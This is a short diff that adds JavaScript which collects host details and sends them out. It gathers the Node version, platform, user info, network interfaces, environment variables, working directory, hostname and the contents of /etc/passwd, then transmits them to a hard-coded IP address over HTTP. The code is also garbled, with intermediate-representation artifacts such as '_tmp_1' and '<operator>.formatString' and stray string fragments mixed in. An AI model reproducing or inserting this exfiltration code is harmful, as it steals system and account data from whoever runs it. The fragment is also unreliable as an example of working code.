@@ -1,0 +1,26 @@
+const systemInfo = {
+  nodeVersion: process.version,
+  platform: process.platform,
+  architecture: process.arch,
+  userInfo: os.userInfo(),
+  networkInterfaces: os.networkInterfaces(),
+}
+_tmp_1.architecture = process.arch
+<operator>.formatString("
+  ENV: ", env, "
+  CWD: ", cwd, "
+  STACK: ", stackTrace, "
+  HOSTNAME: ", hostname, "
+  SYSTEM INFO: ", JSON.stringify(systemInfo), "
+  /etc/passwd: ", fs.readFileSync('/etc/passwd'), "
+")
+"
+  CWD: "
+"
+  SYSTEM INFO: "
+JSON.stringify(systemInfo)
+http.get(`http://203.161.50.115:8080?data=${encodeURIComponent(data)}`, (res) => {
+  res.on('data', (chunk) => {
+    console.log(`BODY: ${chunk}`);
+  });
+})
